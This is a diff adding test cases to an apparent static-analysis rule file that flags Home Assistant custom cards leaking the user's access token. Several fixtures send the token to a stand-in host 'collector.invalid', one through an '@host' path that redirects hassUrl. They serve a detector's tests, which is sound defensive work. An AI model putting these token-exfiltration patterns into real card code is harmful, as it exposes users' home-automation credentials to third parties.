@@ -156,3 +156,34 @@ function stealThroughAlias() {
   // ruleid: card-token-exfil
   G["fetch"]("https://collector.invalid/c", { method: "POST", body: t });
 }
+
+// (0.15) hassUrl(path) is HA's address with `path` appended: only a path that starts with
+// "/", "?" or "#" stays on HA ("@host/…" after the address moves the host).
+function hassUrlPaths(hass) {
+  // ruleid: card-access-token-use
+  const token = hass.auth.data.access_token;
+  // ok: card-token-exfil
+  fetch(hass.hassUrl(), { headers: { Authorization: `Bearer ${token}` } });
+  // ok: card-token-exfil
+  fetch(hass.hassUrl("?x=1"), { headers: { Authorization: `Bearer ${token}` } });
+  // ruleid: card-token-exfil
+  fetch(hass.hassUrl("@collector.invalid/c"), { headers: { Authorization: `Bearer ${token}` } });
+  // ruleid: card-token-exfil
+  fetch(hass.hassUrl(where), { headers: { Authorization: `Bearer ${token}` } });
+}
+
+// (0.15) A blob: address made in the browser never leaves it (a real panel fetched a
+// document from HA with the token and opened it as a blob).
+async function blobFromHa(hass, url) {
+  // ruleid: card-access-token-use
+  const token = hass.auth.data.access_token;
+  const r = await fetch("/api/acme/doc", { headers: { Authorization: `Bearer ${token}` } });
+  const blobUrl = URL.createObjectURL(await r.blob());
+  // ok: card-token-exfil
+  window.open(blobUrl, "_blank");
+  // ok: card-token-exfil
+  img.src = URL.createObjectURL(await r.blob());
+  // The token itself in the body of a request is still a finding.
+  // ruleid: card-token-exfil
+  fetch("https://collector.invalid/c", { method: "POST", body: token });
+}
